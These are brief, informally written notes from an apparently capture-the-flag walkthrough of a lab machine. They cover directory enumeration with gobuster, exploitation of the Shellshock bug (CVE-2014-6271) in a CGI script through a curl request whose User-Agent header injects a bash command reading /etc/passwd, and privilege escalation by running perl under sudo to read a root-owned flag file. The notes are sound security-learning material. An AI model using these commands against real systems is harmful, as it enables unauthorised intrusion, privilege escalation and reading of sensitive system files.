this box shows a website
notting to find
thus gobuster

this found the /cgi-bin/
and further the user.sh

looking further we find an exploit CVE-2014-6271

to understand cgi-bin executes a script from a webpage when visited 
or a request is send to it
in an older version
there is something wrong
and the "user agent" is suceptable to command injection

`curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://{boxip}/cgi-bin/user.sh`

changing the cat /etc/passwd to:
whoami
sudo -l

this we find we can elevate through perl

and so we can get the last flag:
sudo /usr/bin/perl -ne 'print' /root/root.txt